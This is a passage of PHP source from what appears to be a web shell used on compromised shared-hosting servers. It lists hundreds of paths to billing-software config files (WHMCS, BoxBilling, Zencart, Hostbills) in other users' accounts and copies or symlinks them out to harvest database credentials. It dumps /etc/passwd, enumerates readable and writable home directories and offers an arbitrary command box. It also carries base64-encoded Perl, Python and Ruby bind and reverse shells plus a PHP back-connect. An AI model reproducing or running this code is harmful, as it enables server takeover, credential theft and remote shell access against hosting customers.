"/home/$user_brudul/public_html/whmc/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/WHM/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Whm/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/whm/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/HOST/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Host/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/host/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/SUPPORTES/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Supportes/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/supportes/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/domains/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/domain/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Hosting/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/HOSTING/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/hosting/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CART/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Cart/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/cart/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/ORDER/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Order/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/order/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CLIENT/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Client/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/client/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Clientarea/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/clientarea/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/SUPPORT/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Support/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/support/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BILLING/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Billing/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/billing/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BUY/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Buy/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/buy/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/MANAGE/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Manage/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/manage/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/ClientSupport/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Clientsupport/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/clientsupport/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CHECKOUT/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Checkout/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/checkout/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BASKET/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Basket/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/basket/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/SECURE/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Secure/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/secure/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/SALES/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Sales/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/sales/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BILL/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Bill/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/bill/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/PURCHASE/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Purchase/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/purchase/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/ACCOUNT/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Account/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/account/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/USER/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/User/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/user/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/CLIENTS/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Clients/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/clients/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/MY/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/My/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/my/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/secure/whm/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/secure/whmcs/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/panel/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/clientes/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/cliente/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/support/order/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/boxbilling/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/box/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/host/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/Host/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/supportes/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/support/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/hosting/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/cart/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/order/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/client/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/clients/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/cliente/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/clientes/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/billing/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/billings/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/my/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/secure/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/support/order/bb-config.php" => "BoxBilling",
"/home/$user_brudul/public_html/includes/dist-configure.php" => "Zencart",
"/home/$user_brudul/public_html/zencart/includes/dist-configure.php" => "Zencart",
"/home/$user_brudul/public_html/products/includes/dist-configure.php" => "Zencart",
"/home/$user_brudul/public_html/cart/includes/dist-configure.php" => "Zencart",
"/home/$user_brudul/public_html/shop/includes/dist-configure.php" => "Zencart",
"/home/$user_brudul/public_html/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/hostbills/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/host/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/Host/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/supportes/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/support/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/hosting/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/cart/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/order/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/client/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/clients/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/cliente/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/clientes/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/billing/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/billings/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/my/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/secure/includes/iso4217.php" => "Hostbills",
"/home/$user_brudul/public_html/support/order/includes/iso4217.php" => "Hostbills"
);  

foreach($grab_config as $config => $nama_config) {
	if($_POST['config'] == 'grab') {
$ambil_config = file_get_contents($config);
if($ambil_config == '') {
} else {
$file_config = fopen("brudul_configgrab/$user_brudul-$nama_config.txt","w");
fputs($file_config,$ambil_config);
}
}
if($_POST['config'] == 'symlink') {
@symlink($config,"brudul_Symconfig/".$user_brudul."-".$nama_config.".txt");
}
if($_POST['config'] == '404') {
$sym404=symlink($config,"brudul_sym404/".$user_brudul."-".$nama_config.".txt");
if($sym404){
	@mkdir("brudul_sym404/".$user_brudul."-".$nama_config.".txt404", 0777);
	$htaccess="Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
HeaderName Brudul.txt
Satisfy Any
IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
IndexIgnore *";

@file_put_contents("brudul_sym404/".$user_brudul."-".$nama_config.".txt404/.htaccess",$htaccess);

@symlink($config,"brudul_sym404/".$user_brudul."-".$nama_config.".txt404/Brudul.txt");

	}

}

                    }     
		}  if($_POST['config'] == 'grab') {
            echo "<center><a href='?dir=$dir/brudul_configgrab'><font color=lime>Done</font></a></center>";
		}
    if($_POST['config'] == '404') {
        echo "<center>
<a href=\"brudul_sym404/root/\">SymlinkNya</a>
<br><a href=\"brudul_sym404/\">Configurations</a></center>";
    }
     if($_POST['config'] == 'symlink') {
echo "<center>
<a href=\"brudul_symconfig/root/\">Symlinknya</a>
<br><a href=\"brudul_symconfig/\">Configurations</a></center>";
			}if($_POST['config'] == 'symvhost') {
echo "<center>
<a href=\"brudul_symvhost/root/\">Root Server</a>
<br><a href=\"brudul_symvhost/\">Configurations</a></center>";
			}
		
		
		}else{
        echo "<form method=\"post\" action=\"\"><center>
		</center></select><br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
        echo system('cat /etc/passwd'); 
        echo "</textarea><br><br>
        <select class=\"select\" name=\"config\"  style=\"width: 450px;\" height=\"10\">
        <option value=\"grab\">Config Grab</option>
        <option value=\"symlink\">Symlink Config</option>
		<option value=\"404\">Config 404</option>
		<option value=\"symvhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr></center>\n";
}
} elseif($_GET['jancok'] == 'jumping') {
	$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
			foreach($user_jumping[1] as $user_brudul_jump) {
				$user_jumping_dir = "/home/$user_brudul_jump/public_html";
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=white>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=white>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
					}
					echo $jrw;
					if(function_exists('posix_getpwuid')) {
						$domain_jump = file_get_contents("/etc/named.conf");	
						if($domain_jump == '') {
							echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
						} else {
							preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
							foreach($domains_jump[1] as $dj) {
								$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
								$user_jumping_url = $user_jumping_url['name'];
								if($user_jumping_url == $user_brudul_jump) {
									echo " => ( <u>$dj</u> )<br>";
									break;
								}
							}
						}
					} else {
						echo "<br>";
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
	}
	echo "</div></pre>";
} elseif($_GET['backconnect'] == 'tool'){
echo "<br><br><center><form method=post>
<br>	<span>Bind port to /bin/sh [Perl]</span><br/>
	Port: <input type='text' name='port' value='443'> <input type=submit name=bpl value='>>'>
<br><br>
		<span>Back-connect</span><br/>
	Server: <input type='text' name='server' placeholder='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' placeholder='443'><select class='select' name='backconnect'  style='width: 100px;' height='10'><option value='perl'>Perl</option><option value='php'>PHP</option><option value='python'>Python</option><option value='ruby'>Ruby</option></select>
   <input type=submit value='>>'>";
	if($_POST['bpl']) {
	$bp=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
	$brt=@fopen('bp.pl','w');
fwrite($brt,$bp);
$out = exe("perl bp.pl ".$_POST['port']." 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre>$out\n".exe("ps aux | grep bp.pl")."</pre>";
unlink("bp.pl");
		}
		if($_POST['backconnect'] == 'perl') {
$bc=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
$plbc=@fopen('bc.pl','w');
fwrite($plbc,$bc);
$out = exe("perl bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre>$out\n".exe("ps aux | grep bc.pl")."</pre>";
unlink("bc.pl");
}
if($_POST['backconnect'] == 'python') {
$becaa=base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBDb243ZXh0IC0gWGFpIFN5bmRpY2F0ZVxuVGhhbmtzIEdvb2dsZSBGb3IgUmVmZXJlbnNpXG5cbicnJykNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwwKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDEpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMikNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwzKQ0KICAgIHNoZWxsID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pDQogIGV4Y2VwdCBzb2NrZXQudGltZW91dDoNCiAgICBwcmludCAiVGltT3V0Ig0KICBleGNlcHQgc29ja2V0LmVycm9yLCBlOg0KICAgIHByaW50ICJFcnJvciIsIGUNCnB5YmFja2Nvbm5lY3QoKQ==");
$pbcaa=@fopen('bcpyt.py','w');
fwrite($pbcaa,$becaa);
$out1 = exe("python bcpyt.py ".$_POST['server']." ".$_POST['port']);
sleep(1);
echo "<pre>$out1\n".exe("ps aux | grep bcpyt.py")."</pre>";
unlink("bcpyt.py");
}
if($_POST['backconnect'] == 'ruby') {
$becaak=base64_decode("IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k");
$pbcaak=@fopen('bcruby.rb','w');
fwrite($pbcaak,$becaak);
$out2 = exe("ruby bcruby.rb ".$_POST['server']." ".$_POST['port']);
sleep(1);
echo "<pre>$out2\n".exe("ps aux | grep bcruby.rb")."</pre>";
unlink("bcruby.rb");
}
if($_POST['backconnect'] == 'php') {
            $ip = $_POST['server'];
            $port = $_POST['port'];
            $sockfd = fsockopen($ip , $port , $errno, $errstr );
            if($errno != 0){
              echo "<font color='red'>$errno : $errstr</font>";
            } else if (!$sockfd)  {
              $result = "<p>Unexpected error has occured, connection may have failed.</p>";
            } else {
              fputs ($sockfd ,"
                \n{################################################################}
                \n..:: BackConnect Php By Con7ext ::..
                \n{################################################################}\n");
              $dir = shell_exec("pwd");
              $sysinfo = shell_exec("uname -a");
              $time = Shell_exec("time");
              $len = 1337;
              fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "\n\n");
              while(!feof($sockfd)){ $cmdPrompt = '[Con7ext]#:> ';
              fputs ($sockfd , $cmdPrompt );
              $command= fgets($sockfd, $len);
              fputs($sockfd , "\n" . shell_exec($command) . "\n\n");
            }
            fclose($sockfd);
            }
          }
		echo "</p></div>";
} elseif($_GET['jancok'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=white><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=white><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}elseif($_GET['jancok'] == 'cmd') {
echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".gethostbyname($_SERVER['HTTP_HOST']).": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre><textarea>".exe($_POST['cmd'])."</textarea></pre>";
	}
}
elseif($_GET['jancok'] == 'cpanel') {
@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}
echo '<br><br><style>
textarea {
resize:none;
color:black;
background-color:#ffffff;  
font-size:8pt; color:black;
border:1px solid white ;
border-left: 4px solid white ;
}
input {
color: black;
border:1px dotted white;
}
</style>';
echo '<center>';
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");
if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
